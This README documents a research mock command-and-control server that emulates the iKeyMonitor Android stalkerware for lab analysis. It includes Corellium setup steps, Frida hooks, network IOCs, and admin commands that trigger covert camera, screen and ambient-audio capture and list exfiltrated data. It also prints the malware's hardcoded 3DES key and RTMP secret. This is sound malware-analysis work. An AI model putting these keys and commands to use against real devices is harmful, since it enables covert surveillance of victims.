# iKeyMonitor v17.4 + v19.1 — Mock C2 Server

Mock C2 pour l'analyse en lab de l'APK iKeyMonitor Android, **cross-version** :
un seul serveur gère à la fois la **v17.4** (endpoints avec typos `uoload`) et la
**v19.1** (endpoints corrigés/renommés), en normalisant les anciens noms vers la
forme canonique v19.1.

Dual-canal : REST API + WebSocket, avec support RTMP pour le screen streaming.

> **Research use only** — ASTRA / LHS-LORIA.

Analyse delta des deux versions : `../ikeymonitor_v19.1_delta.md`.

---

## Ce qui change entre v17.4 et v19.1 (et ce qui ne change pas)

| Aspect | v17.4 | v19.1 | Côté mock |
|---|---|---|---|
| Endpoints REST | 25 (5 typos `uoload`) | 28 (typos corrigées + renommages) | **normalisés par alias** |
| Cibles chat | 9 apps | 15 (+WhatsApp Business, Gmail, Instagram, Skype, TikTok, X) | app-side, transparent |
| GPP bypass | présent | étendu à 15 langues | app-side, transparent |
| Package name | `com.sec.android.internet.im.service.im20210815` | `com.android.internet.a20251031` | hook Frida distinct |
| Crypto 3DES | clé `ccc707d2924768f2cc12bc8b` | **identique** | — |
| Secret RTMP | `C4hgdA%Qc5UHfqEho&Ke` | **identique** | — |
| WebSocket XML | `<IKMService>` | **identique** | — |
| C2 infra | `ikmws.awsapi.io` + 4 mirrors | **identique** | — |

---

## Lancement rapide

```bash
uv sync

# HTTPS :8443 (défaut) — génère cert.pem + key.pem au premier lancement
uv run python server.py

# HTTP :8080 — debug, sans TLS
uv run python server.py --http

# Forcer un nouveau certificat
uv run python server.py --regen-cert

# Port custom
uv run python server.py --port 9443
```

---

## Setup lab complet (Corellium)

### 1. Lancer le serveur mock

```bash
cd ikeymonitor/mock_c2
uv sync
uv run python server.py
```

Au premier lancement, `cert.pem` et `key.pem` sont générés automatiquement.
Le SAN couvre `localhost`, `127.0.0.1`, `10.11.1.1`, `10.0.2.2`
et les 5 domaines C2 iKeyMonitor — pas besoin de regénérer.

### 2. Récupérer l'IP de la machine qui héberge le mock

```bash
# macOS
ipconfig getifaddr en0
```

On appelle cette IP `<MOCK_IP>` dans la suite.

### 3. Rediriger le DNS dans Corellium

Dans l'interface Corellium, **Network > DNS** (ou via le profil réseau du device),
ajouter des entrées pour les 5 domaines C2 :

```
<MOCK_IP>  ikmws.awsapi.io
<MOCK_IP>  ikmws-mirror.awsapi.io
<MOCK_IP>  ikm-sv2.awsapi.io
<MOCK_IP>  ikm-sv3.awsapi.io
<MOCK_IP>  ikm-sv4.awsapi.io
```

Alternative si le DNS Corellium n'est pas accessible : utiliser un serveur DNS local
(dnsmasq ou similaire) pointé sur `<MOCK_IP>` pour ces domaines.

### 4. Installer le certificat sur le device virtuel

Récupérer `cert.pem` depuis `mock_c2/cert.pem` et l'installer sur le device Android
Corellium comme **certificat utilisateur** :

```bash
# Pousser via ADB (Corellium expose un ADB bridge)
adb push cert.pem /sdcard/ikm_mock.pem
```

Ensuite sur le device :
**Paramètres → Sécurité → Chiffrement et identifiants → Installer un certificat
→ Certificat CA → sélectionner `ikm_mock.pem`**

iKeyMonitor trust les user certs (pas de SSL pinning) — pas besoin du system store.

### 5. Vérifier la redirection DNS

Depuis le device (via ADB shell ou terminal Corellium) :

```bash
nslookup ikmws.awsapi.io
# doit retourner <MOCK_IP>
```

Et vérifier que le mock répond :

```bash
curl -k https://ikmws.awsapi.io:8443/index.php?m=api&a=register
# doit retourner un XML <IKMService>
```

### 6. Lancer les hooks Frida

```bash
# Frida server doit tourner sur le device (Corellium le fournit en général)

# v17.4
frida -U -f com.sec.android.internet.im.service.im20210815 \
    -l ikeymonitor_hook.js --no-pause

# v19.1
frida -U -f com.android.internet.a20251031 \
    -l ikeymonitor_v19.1_hook.js --no-pause
```

### 7. Lancer l'APK

Démarrer iKeyMonitor depuis Corellium. Observer :
- Les logs du mock C2 (`logs/c2.log` ou stdout).
- Les logs Frida dans le terminal.

Le device doit s'enregistrer (action `register`) puis démarrer le cycle heartbeat
(action `cycle` toutes les ~5 min).

### 8. (Optionnel) RTMP pour le screen streaming

```bash
docker run -d -p 1935:1935 tiangolo/nginx-rtmp
```

L'APK push vers `rtmp://<MOCK_IP>/<device_id>?sign=<ts>-<md5>`.
Le serveur mock fournit la signature via `/admin/crypto/rtmp_sign`.

---

## Vérification du bon fonctionnement

### Vérifier que le serveur tourne

```bash
curl -k https://localhost:8443/admin/status
```

Réponse attendue :
```json
{
  "devices": [],
  "ws_connections": 0,
  "exfiltrated_count": 0,
  "command_queue": 0,
  "supported_versions": ["v17.4", "v19.1"]
}
```

### Simuler un device (sans APK)

```bash
uv run python test_client.py --host 127.0.0.1 --port 8443
```

Doit afficher : `register → 200`, `cycle → 200`, connexion WS + handshake `onConnect`.

### Vérifier qu'un device est connecté

```bash
curl -k https://localhost:8443/admin/status | python3 -m json.tool
```

Le champ `devices` doit lister le device avec `version`, `first_seen`, `last_seen`.

---

## Commandes temps réel (WebSocket via Admin API)

Une fois un device connecté :

```bash
# Capture photo (front / back)
curl -k -X POST "https://localhost:8443/admin/cmd/camera?camera_type=front"
curl -k -X POST "https://localhost:8443/admin/cmd/camera?camera_type=back"

# Screenshot
curl -k -X POST "https://localhost:8443/admin/cmd/screenshot"

# Screen streaming RTMP (start / stop)
curl -k -X POST "https://localhost:8443/admin/cmd/screenstream?enable=1"
curl -k -X POST "https://localhost:8443/admin/cmd/screenstream?enable=0"

# Enregistrement ambiant (durée en secondes)
curl -k -X POST "https://localhost:8443/admin/cmd/surrounding?enable=1&duration=60"
curl -k -X POST "https://localhost:8443/admin/cmd/surrounding?enable=0"

# Commande XML brute
curl -k -X POST "https://localhost:8443/admin/cmd/raw" \
    -d '<IKMService><RequestType>camera_snap</RequestType><RequestId>1</RequestId><Camera><Enable>1</Enable><Type>front</Type></Camera></IKMService>'
```

---

## Inspection des données exfiltrées

```bash
# Toutes les exfiltrations (50 dernières)
curl -k "https://localhost:8443/admin/exfiltrated?limit=50"

# Filtrer par type
curl -k "https://localhost:8443/admin/exfiltrated/by_type/upload_keystrokes"
curl -k "https://localhost:8443/admin/exfiltrated/by_type/upload_gps_history"
curl -k "https://localhost:8443/admin/exfiltrated/by_type/upload_chat_logs"

# Mapping endpoints (aliases v17.4 → v19.1)
curl -k "https://localhost:8443/admin/endpoints"

# Export de session complet
curl -k "https://localhost:8443/admin/session/export"
```

Les fichiers bruts sont dans `uploads/` :

```
uploads/
├── photos/         # upload_photo
├── screenshots/    # upload_screenshot
├── video/          # upload_video, upload_screenvideo
├── surrounding/    # upload_surrounding
├── chat_img/       # upload_chat_img
├── call_img/       # upload_call_img
├── keystrokes/     # upload_keystrokes
├── chats/          # upload_chat_logs
├── gps/            # upload_gps_history
├── calls/          # upload_call_history
├── web_history/    # upload_website_history
├── clipboard/      # upload_clipboard
├── contacts/       # upload_contact
├── calendar/       # upload_calendar
├── wifi/           # upload_wifi
├── debug/          # upload_debug_logs
├── crash_logs/     # upload_weekly_crash_logs
└── misc/           # fallback (actions inconnues)
```

---

## Outils crypto

```bash
# Chiffrer une chaîne avec la clé 3DES iKM
curl -k "https://localhost:8443/admin/crypto/encrypt?plaintext=TEST-LICENSE-001"

# Déchiffrer
curl -k "https://localhost:8443/admin/crypto/decrypt?ciphertext=<base64>"

# Calculer la signature RTMP pour un device
curl -k "https://localhost:8443/admin/crypto/rtmp_sign?device_id=AA:BB:CC:DD:EE:FF"
```

---

## Architecture

```
┌──────────────┐     REST (HTTPS :8443)    ┌─────────────────┐
│  APK iKM     │  ─── /index.php? ───────▶  │  Mock C2 Server │
│  v17.4 /     │      m=api&a={action}     │  (FastAPI)      │
│  v19.1       │  ◀── XML response ──────  │                 │
│              │                           │  alias table    │
│              │     WebSocket (WSS :8443) │  v17.4 → v19.1  │
│              │  ◀──── /ws ──────────────▶│                 │
│              │       XML commands        │  Admin API      │
│              │                           │  /admin/*       │
│              │     RTMP (:1935)          │                 │
│              │  ──── screen stream ────▶  └─────────────────┘
└──────────────┘
```

---

## Crypto

- **3DES/ECB/PKCS5** — clé hardcodée `ccc707d2924768f2cc12bc8b` (24 octets)
- **Signature RTMP** — `MD5("/live/" + device_id + "-" + ts + "-" + secret)`, secret `C4hgdA%Qc5UHfqEho&Ke`
- **Pas de SSL pinning** — user certs acceptés nativement par iKM

---

## IOC réseau

| IOC | Portée |
|---|---|
| URL `index.php?m=api&a=` | cross-version |
| XML WebSocket `<IKMService>` | cross-version |
| HealthCheck `<ThreerdPartySecurityapps>` (typo) | cross-version, fiable |
| User-Agent WS `com.ab.ikm.portal.request` | cross-version |
| `a=uoload_keystrokes` | **v17.4 uniquement** |
| `a=upload_keystrokes` | **v19.1+** |
| Package `...im20210815` / `...a20251031` | discrimine la version |

---

## Fichiers

| Fichier | Description |
|---|---|
| `server.py` | Serveur FastAPI cross-version (REST + WebSocket + Admin + crypto) |
| `test_client.py` | Client de test — simule le protocole APK sans device |
| `ikeymonitor_hook.js` | Hooks Frida — v17.4 |
| `ikeymonitor_v19.1_hook.js` | Hooks Frida — v19.1 (classes obfusquées) |
| `gen_cert.py` | Générateur de cert TLS standalone (aussi intégré dans `server.py`) |
| `pyproject.toml` | Dépendances Python (fastapi, uvicorn, websockets, pycryptodome, cryptography) |
